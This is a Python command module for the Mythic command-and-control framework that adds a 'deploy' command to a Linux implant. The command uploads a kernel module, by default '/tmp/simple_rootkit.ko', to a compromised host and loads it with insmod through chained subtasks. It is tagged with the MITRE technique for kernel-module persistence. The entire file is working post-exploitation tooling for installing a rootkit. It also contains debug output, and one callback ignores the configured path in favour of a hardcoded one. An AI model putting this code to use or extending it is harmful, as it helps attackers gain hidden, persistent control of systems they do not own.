from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import os


class DeployArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="Kernel module (.ko file) to deploy",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    )
                ]
            ),
            CommandParameter(
                name="remote_path",
                type=ParameterType.String,
                description="Target path where to deploy the kernel module",
                default_value="/tmp/simple_rootkit.ko",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default"
                    )
                ]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        
        self.load_args_from_json_string(self.command_line)
        
        # Ensure path has default value if not provided
        if not self.get_arg("remote_path"):
            self.add_arg("remote_path", "/tmp/simple_rootkit.ko")


# Completion callback for upload subtask
async def upload_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Handle completion of upload subtask, then create shell subtask"""
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    
    # Check if upload was successful
    task_status = completionMsg.TaskData.Task.Status.lower()
    if "error" in task_status or not task_status.startswith("success"):
        response.Success = False
        response.TaskStatus = "error: Upload failed"
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=completionMsg.TaskData.Task.ParentTaskID,
            Response=f"Upload subtask failed with status: {completionMsg.TaskData.Task.Status}".encode()
        ))
        return response
    
    try:
        # Use a default path - we'll make this more robust in the next iteration
        target_path = "/tmp/simple_rootkit.ko"
        
        # Create shell subtask for insmod using the parent task ID
        parent_task_id = completionMsg.TaskData.Task.ParentTaskID
        
        shell_result = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=parent_task_id,
            CommandName="shell",
            Params=f"insmod {target_path}",
            SubtaskCallbackFunction="shell_complete",
            Token=completionMsg.TaskData.Task.TokenID
        ))
        
        if not shell_result.Success:
            response.Success = False
            response.TaskStatus = f"error: Failed to create insmod subtask: {shell_result.Error}"
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=parent_task_id,
                Response=f"Failed to create insmod subtask: {shell_result.Error}".encode()
            ))
        else:
            response.TaskStatus = f"Upload successful, executing: insmod {target_path}"
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=parent_task_id,
                Response=f"Upload completed successfully, now running: insmod {target_path}".encode()
            ))
            
    except Exception as e:
        response.Success = False
        response.TaskStatus = f"error: Exception in upload completion: {str(e)}"
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=completionMsg.TaskData.Task.ParentTaskID if hasattr(completionMsg.TaskData.Task, 'ParentTaskID') else completionMsg.TaskData.Task.ID,
            Response=f"Exception in upload completion: {str(e)}".encode()
        ))
        
    return response


# Completion callback for shell subtask  
async def shell_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Handle completion of shell (insmod) subtask"""
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    
    # Check if insmod was successful
    task_status = completionMsg.TaskData.Task.Status.lower()
    parent_task_id = completionMsg.TaskData.Task.ParentTaskID
    
    if "error" in task_status:
        response.Success = False
        response.TaskStatus = "error: insmod command failed"
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=parent_task_id,
            Response=f"insmod command failed with status: {completionMsg.TaskData.Task.Status}".encode()
        ))
    else:
        response.TaskStatus = "✅ Kernel module deployed successfully!"
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=parent_task_id,
            Response="✅ Kernel module deployment completed successfully!".encode()
        ))
    
    return response


class DeployCommand(CommandBase):
    cmd = "deploy"
    needs_admin = True
    help_cmd = "deploy"
    description = "Deploy a kernel module by uploading and loading it with insmod"
    version = 1
    author = ""
    attackmapping = ["T1547.006"]
    argument_class = DeployArguments
    browser_script = BrowserScript(script_name="deploy", author="@its_a_feature_")
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Linux],
        builtin=False,
        load_only=False,
        suggested_command=False,
    )
    completion_functions = {
        "upload_complete": upload_complete,
        "shell_complete": shell_complete
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        try:
            # Debug: Show all available arguments
            all_args = {}
            for arg_name in ["file", "remote_path"]:
                arg_value = taskData.args.get_arg(arg_name)
                all_args[arg_name] = arg_value
            
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"[DEBUG] Raw arguments received: {all_args}".encode()
            ))
            
            # Get arguments
            file_uuid = taskData.args.get_arg("file")
            target_path = taskData.args.get_arg("remote_path")
            
            # Apply default if path is None, empty, or just whitespace
            if not target_path or str(target_path).strip() == "":
                target_path = "/tmp/simple_rootkit.ko"
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=f"[DEBUG] Applied default path: {target_path}".encode()
                ))
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=f"[DEBUG] Using provided path: {target_path}".encode()
                ))
            
            if not file_uuid:
                response.Success = False
                response.Error = "No file specified for deployment"
                return response
            
            # Store deployment info for callbacks
            deploy_info = {
                "file_uuid": file_uuid,
                "target_path": target_path
            }
            
            # Create upload subtask with explicit parameters
            upload_params = {
                "file": file_uuid,
                "remote_path": target_path
            }
            
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"[DEBUG] Creating upload subtask with params: {json.dumps(upload_params)}".encode()
            ))
            
            upload_result = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                CommandName="upload",
                Params=json.dumps(upload_params),
                SubtaskCallbackFunction="upload_complete",
                Token=taskData.Task.TokenID
            ))
            
            if not upload_result.Success:
                response.Success = False
                response.Error = f"Failed to create upload subtask: {upload_result.Error}"
                return response
            
            # Update display params with deployment info for callbacks
            response.DisplayParams = json.dumps(deploy_info)
                
        except Exception as e:
            response.Success = False
            response.Error = f"Exception in deploy task creation: {str(e)}"
            
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp